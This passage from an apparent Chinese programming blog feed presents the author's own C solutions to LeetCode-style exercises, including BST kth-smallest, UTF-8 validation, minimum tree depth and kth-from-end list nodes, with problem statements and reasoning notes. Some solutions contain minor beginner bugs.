class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">findMin</span><span class="hljs-params">(<span class="hljs-type">int</span>* nums, <span class="hljs-type">int</span> numsSize)</span>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">if</span>(numsSize &lt;= <span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//判断数组长度是否为1，为1直接返回</span><br>        <span class="hljs-keyword">return</span> nums[numsSize- <span class="hljs-number">1</span>]; <br>    &#125;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;numsSize - <span class="hljs-number">1</span>;i++)&#123;<span class="hljs-comment">//一般情况</span><br>        <span class="hljs-keyword">if</span>(nums[i]&gt;nums[i+<span class="hljs-number">1</span>])&#123;<br>            <span class="hljs-keyword">return</span> nums[i+<span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(nums[numsSize<span class="hljs-number">-1</span>] &lt; nums[<span class="hljs-number">0</span>])&#123;<span class="hljs-comment">//全反转情况</span><br>        <span class="hljs-keyword">return</span> nums[numsSize - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<span class="hljs-comment">//未反转情况</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-二叉搜索树中第K小的元素"><a href="#4-二叉搜索树中第K小的元素" class="headerlink" title="4.二叉搜索树中第K小的元素"></a>4.二叉搜索树中第K小的元素</h2><h3 id="4-1题目描述"><a href="#4-1题目描述" class="headerlink" title="4.1题目描述"></a>4.1题目描述</h3><p>给定一个二叉搜索树，编写一个函数 kthSmallest 来查找其中第 k 个最小的元素。</p><p>说明：<br>你可以假设 k 总是有效的，1 ≤ k ≤ 二叉搜索树元素个数。</p><p>示例 1:</p><p>输入: root &#x3D; [3,1,4,null,2], k &#x3D; 1<br>   3<br>  &#x2F; <br> 1   4<br>  <br>   2<br>输出: 1</p><p>示例 2:</p><p>输入: root &#x3D; [5,3,6,2,4,null,null,1], k &#x3D; 3<br>       5<br>      &#x2F; <br>     3   6<br>    &#x2F; <br>   2   4<br>  &#x2F;<br> 1<br>输出: 3</p><p>来源：<a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst">https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst</a></p><h3 id="4-2思路分析"><a href="#4-2思路分析" class="headerlink" title="4.2思路分析"></a>4.2思路分析</h3><p>最开始忘记了二叉搜索树的性质，所以还想着遍历之后再排序，后来发现二叉排序树是有性质的，采用中序遍历的结果就是从小到大排列的值。</p><p>于是我们可以递归采用中序遍历选出第k个值即可。</p><p>为了优化算法，我们在找到第k个值之后就结束，这样就可以减小搜索的时间复杂度。</p><h3 id="4-3代码"><a href="#4-3代码" class="headerlink" title="4.3代码"></a>4.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//因为是二叉查找树，所以节点比左孩子小，比右孩子大，</span><br><span class="hljs-comment">//使用递归的方法进行中序遍历，遍历的过程中将节点存入到队列中，队列中的元素即为从小到大排序好了，</span><br><span class="hljs-comment">//最后要第K小的元素，就从队列中出队好了</span><br><span class="hljs-comment">//遍历到第k个元素即可停止遍历</span><br><span class="hljs-type">int</span> findResult[<span class="hljs-number">100</span>],counter;<br><span class="hljs-type">void</span> <span class="hljs-title function_">LDR</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode * root,<span class="hljs-type">int</span> k)</span>&#123;<span class="hljs-comment">//</span><br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span> || counter &gt; k)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    LDR(root-&gt;left,k);<br>    findResult[counter++] = root-&gt;val;<br>    LDR(root-&gt;right,k);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">kthSmallest</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root, <span class="hljs-type">int</span> k)</span>&#123;<br>    counter = <span class="hljs-number">0</span>;<br>    LDR(root,k);<br>    <span class="hljs-keyword">return</span> findResult[k<span class="hljs-number">-1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-4复习遍历算法"><a href="#4-4复习遍历算法" class="headerlink" title="4.4复习遍历算法"></a>4.4复习遍历算法</h3><h4 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h4><p>前序遍历首先访问根结点然后遍历左子树，最后遍历右子树。在遍历左、右子树时，仍然先访问根结点，然后遍历左子树，最后遍历右子树。</p><p>若二叉树为空则结束返回，否则：</p><ul><li>访问根节点</li><li>前序遍历左子树</li><li>前序遍历右子树</li></ul><p>已知后序遍历和中序遍历，就能确定前序遍历。</p><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>中序遍历首先遍历左子树，然后访问根结点，最后遍历右子树。若二叉树为空则结束返回，否则：</p><ul><li>中序遍历左子树</li><li>访问根结点</li><li>中序遍历右子树</li></ul><h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><p>后序遍历首先遍历左子树，然后遍历右子树，最后访问根结点，在遍历左、右子树时，仍然先遍历左子树，然后遍历右子树，最后遍历根结点。</p><p>若二叉树为空则结束返回，否则：</p><ul><li>后序遍历左子树</li><li>后序遍历右子树</li><li>访问根节点</li></ul><p>三种遍历算法采用递归最容易实现。</p><h2 id="5-UTF8编码验证"><a href="#5-UTF8编码验证" class="headerlink" title="5.UTF8编码验证"></a>5.UTF8编码验证</h2><h3 id="5-1题目描述"><a href="#5-1题目描述" class="headerlink" title="5.1题目描述"></a>5.1题目描述</h3><p>UTF-8 中的一个字符可能的长度为 1 到 4 字节，遵循以下的规则：</p><pre><code class="hljs">对于 1 字节的字符，字节的第一位设为0，后面7位为这个符号的unicode码。对于 n 字节的字符 (n &gt; 1)，第一个字节的前 n 位都设为1，第 n+1 位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。</code></pre><p>这是 UTF-8 编码的工作方式：</p><p>   Char. number range  |        UTF-8 octet sequence<br>      (hexadecimal)          |              (binary)<br>   ——————————-+———————————————<br>   0000 0000-0000 007F | 0xxxxxxx<br>   0000 0080-0000 07FF | 110xxxxx 10xxxxxx<br>   0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx<br>   0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</p><p>给定一个表示数据的整数数组，返回它是否为有效的 utf-8 编码。</p><p>注意:<br>输入是整数数组。只有每个整数的最低 8 个有效位用来存储数据。这意味着每个整数只表示 1 字节的数据。</p><p>来源：<a href="https://leetcode-cn.com/problems/utf-8-validation">https://leetcode-cn.com/problems/utf-8-validation</a></p><h3 id="5-2思路分析"><a href="#5-2思路分析" class="headerlink" title="5.2思路分析"></a>5.2思路分析</h3><p>最简单的思路就是不做什么进制转换，直接按照不同条件分支判断即可，然后判断后面的字符是否符合标准，如果有一个不符合就直接返回false。中间踩了一个坑，就是忘记了数字位数不够的问题，导致数组访问溢出的情况。</p><h3 id="5-3代码"><a href="#5-3代码" class="headerlink" title="5.3代码"></a>5.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">validUtf8</span><span class="hljs-params">(<span class="hljs-type">int</span>* data, <span class="hljs-type">int</span> dataSize)</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j;<br>    <span class="hljs-keyword">while</span>(i&lt;dataSize)&#123;<br>        <span class="hljs-keyword">if</span>(data[i]&gt;=<span class="hljs-number">240</span>&amp;&amp;data[i]&lt;=<span class="hljs-number">247</span>)&#123;<span class="hljs-comment">//情形4</span><br>            <span class="hljs-keyword">if</span>(dataSize&lt;<span class="hljs-number">4</span>)&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            <span class="hljs-keyword">for</span>(j = <span class="hljs-number">1</span>;j &lt; <span class="hljs-number">4</span>;j++)&#123;<br>                <span class="hljs-keyword">if</span>(data[i+j]&lt;<span class="hljs-number">128</span>||data[i+j]&gt;<span class="hljs-number">191</span>)&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            i = i+<span class="hljs-number">4</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(data[i]&gt;=<span class="hljs-number">224</span>&amp;&amp;data[i]&lt;=<span class="hljs-number">239</span>)&#123;<span class="hljs-comment">//情形3</span><br>            <span class="hljs-keyword">for</span>(j = <span class="hljs-number">1</span>;j &lt; <span class="hljs-number">3</span>;j++)&#123;<br>                <span class="hljs-keyword">if</span>(dataSize&lt;<span class="hljs-number">3</span>)&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(data[i+j]&lt;<span class="hljs-number">128</span>||data[i+j]&gt;<span class="hljs-number">191</span>)&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            i = i+<span class="hljs-number">3</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(data[i]&gt;=<span class="hljs-number">192</span>&amp;&amp;data[i]&lt;=<span class="hljs-number">223</span>)&#123;<span class="hljs-comment">//情形2</span><br>            <span class="hljs-keyword">if</span>(dataSize&lt;<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(data[i+<span class="hljs-number">1</span>]&lt;<span class="hljs-number">128</span>||data[i+<span class="hljs-number">1</span>]&gt;<span class="hljs-number">191</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;  <br>            i = i+<span class="hljs-number">2</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(data[i]&lt;=<span class="hljs-number">127</span>)&#123;<span class="hljs-comment">//情形1</span><br>            i = i + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//不符合要求</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-二叉树的最小深度"><a href="#6-二叉树的最小深度" class="headerlink" title="6.二叉树的最小深度"></a>6.二叉树的最小深度</h2><h3 id="6-1题目描述"><a href="#6-1题目描述" class="headerlink" title="6.1题目描述"></a>6.1题目描述</h3><p>给定一个二叉树，找出其最小深度。</p><p>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例:</p><p>给定二叉树 [3,9,20,null,null,15,7],</p><pre><code class="hljs">3</code></pre><p>   &#x2F; <br>  9  20<br>    &#x2F;  <br>   15   7</p><p>返回它的最小深度  2.</p><p>来源：<a href="https://leetcode-cn.com/problems/minimum-depth-of-binary-tree">https://leetcode-cn.com/problems/minimum-depth-of-binary-tree</a></p><h3 id="6-2思路分析"><a href="#6-2思路分析" class="headerlink" title="6.2思路分析"></a>6.2思路分析</h3><p>第一思路就是使用递归遍历，遍历整棵树后即可获得树的最小深度。</p><p>递归算法一定要注意，当时我将depth初始化为0的时候会出错，因为后面有个取最小值的步骤，如果深度初始化为0，每次取最小值都取0，最后结果肯定是错误的。因此我们需要取一个最大的值，保证不会出问题。</p><h3 id="6-3代码"><a href="#6-3代码" class="headerlink" title="6.3代码"></a>6.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">min</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-keyword">if</span> (a&lt;=b)&#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minDepth</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> depth = <span class="hljs-number">65535</span>;<span class="hljs-comment">//不应该初始化为0，应该初始化为一个大的值</span><br>    <span class="hljs-keyword">if</span>(root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(root-&gt;left != <span class="hljs-literal">NULL</span>)&#123;<br>        depth = min(minDepth(root-&gt;left),depth);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(root-&gt;right != <span class="hljs-literal">NULL</span>)&#123;<br>        depth = min(minDepth(root-&gt;right),depth);<br>    &#125;<br>    <span class="hljs-keyword">return</span> depth+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法练习</title>
    <link href="/blog/2020/02/22/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
    <url>/blog/2020/02/22/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>假期闲着没事干刷刷算法题，为以后找工作面试做一下准备工作</strong></p><p><img src="/images/fj27.jpg"></p><span id="more"></span><h2 id="1-数组中的重复数字"><a href="#1-数组中的重复数字" class="headerlink" title="1.数组中的重复数字"></a>1.数组中的重复数字</h2><h3 id="1-1题目描述"><a href="#1-1题目描述" class="headerlink" title="1.1题目描述"></a>1.1题目描述</h3><p>在一个长度为 n 的数组里的所有数字都在 0 到 n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字是重复的，也不知道每个数字重复几次。请找出数组中任意一个重复的数字。要求时间复杂度 O(N)，空间复杂度 O(1)。</p><h3 id="1-2思路分析"><a href="#1-2思路分析" class="headerlink" title="1.2思路分析"></a>1.2思路分析</h3><p>为了使时间复杂度和空间复杂度满足要求，不能使用排序或者再创建一个数组记录。对于数组元素在0到n-1范围内的数组我们可以采用将值为 i 的元素调整到第 i 个位置上进行求解。本题要求找出重复的数字，因此在调整过程中，如果第 i 位置上已经有一个值为 i 的元素，就可以知道 i 值重复。</p><h3 id="1-3代码"><a href="#1-3代码" class="headerlink" title="1.3代码"></a>1.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> *nums,<span class="hljs-type">int</span> i,<span class="hljs-type">int</span> j)</span>&#123;<span class="hljs-comment">//将nums数组中i位置和j位置交换 </span><br><span class="hljs-type">int</span> temp;<br>temp = nums[i];<br>nums[i] = nums[j];<br>nums[j] = temp;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> nums[]=&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>&#125;,i,j;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">6</span>;i++)&#123;<br><span class="hljs-keyword">if</span>(nums[i]!=i)&#123;<span class="hljs-comment">//保证当前位置数字没有交换过 </span><br><span class="hljs-keyword">if</span>(nums[i]==nums[nums[i]])<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,nums[i]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>swap(nums,i,nums[i]);<br>&#125;<br><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no repeat num\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-跳台阶问题"><a href="#2-跳台阶问题" class="headerlink" title="2.跳台阶问题"></a>2.跳台阶问题</h2><h3 id="2-1-题目描述"><a href="#2-1-题目描述" class="headerlink" title="2.1 题目描述"></a>2.1 题目描述</h3><p>一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。</p><h3 id="2-2-思路分析"><a href="#2-2-思路分析" class="headerlink" title="2.2 思路分析"></a>2.2 思路分析</h3><p>假设到第 n 阶总共有 f(n) 种跳法，而且想跳到第 n 阶只有两种可能，要么从第 n-1 阶跳一阶到达，要么从第 n-2 阶跳两阶到达，所以递推式为f(n) &#x3D; f(n-1) + f(n-2)。特殊情况为，n&#x3D;0 的时候跳法为 0；n&#x3D;1时，跳法为1；n&#x3D;2时，跳法为2。</p><h3 id="2-3-代码"><a href="#2-3-代码" class="headerlink" title="2.3 代码"></a>2.3 代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">jump</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>&#123;<br><span class="hljs-keyword">if</span>(num &lt; <span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(num == <span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(num == <span class="hljs-number">2</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-keyword">return</span> jump(num<span class="hljs-number">-1</span>)+jump(num<span class="hljs-number">-2</span>);<span class="hljs-comment">//使用递归算法 </span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> num,result;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br>result = jump(num);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,result);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="3-链表中倒数第k个节点"><a href="#3-链表中倒数第k个节点" class="headerlink" title="3.链表中倒数第k个节点"></a>3.链表中倒数第k个节点</h2><h3 id="3-1题目描述"><a href="#3-1题目描述" class="headerlink" title="3.1题目描述"></a>3.1题目描述</h3><p>难度简单8输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。例如，一个链表有6个节点，从头节点开始，它们的值依次是1、2、3、4、5、6。这个链表的倒数第3个节点是值为4的节点。</p><h3 id="3-2思路分析"><a href="#3-2思路分析" class="headerlink" title="3.2思路分析"></a>3.2思路分析</h3><p>最开始想到的思路也是最容易想到的就是先计算链表长度，然后减k，从head遍历这个长度后返回即是倒数第k个节点。</p><h3 id="3-3代码"><a href="#3-3代码" class="headerlink" title="3.3代码"></a>3.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">getKthFromEnd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* head, <span class="hljs-type">int</span> k)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">p1</span>;</span><br>    p1 = head;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(;p1-&gt;next!=<span class="hljs-literal">NULL</span>;p1=p1-&gt;next)&#123;<br>        num++;<br>    &#125;<br>    num = num - k;<br>    <span class="hljs-keyword">for</span>(;num&gt;=<span class="hljs-number">0</span>;num--)&#123;<br>        head = head-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-4参考最优解法"><a href="#3-4参考最优解法" class="headerlink" title="3.4参考最优解法"></a>3.4参考最优解法</h3><p>设置两个指针，快指针比慢指针深入k个节点， 当快指针为空时，慢指针也就到了size(head)-k个节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">getKthFromEnd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* head, <span class="hljs-type">int</span> k)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">p1</span>;</span><br>    p1 = head;<br>    <span class="hljs-keyword">for</span>(;k&gt;<span class="hljs-number">0</span>;k--)&#123;<br>        p1 = p1-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(p1!=<span class="hljs-literal">NULL</span>)&#123;<br>        p1 = p1-&gt;next;<br>        head = head-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-左叶子之和"><a href="#4-左叶子之和" class="headerlink" title="4.左叶子之和"></a>4.左叶子之和</h2><h3 id="4-1题目描述"><a href="#4-1题目描述" class="headerlink" title="4.1题目描述"></a>4.1题目描述</h3><p>计算给定二叉树的所有左叶子之和。</p><h3 id="4-2思路分析"><a href="#4-2思路分析" class="headerlink" title="4.2思路分析"></a>4.2思路分析</h3><p>用递归算法比较容易，采用广度优先递归遍历算法，递归时判断该节点是不是叶节点以及是不是左叶节点。</p><h3 id="4-3代码"><a href="#4-3代码" class="headerlink" title="4.3代码"></a>4.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sumOfLeftLeaves</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(root-&gt;left != <span class="hljs-literal">NULL</span> &amp;&amp; 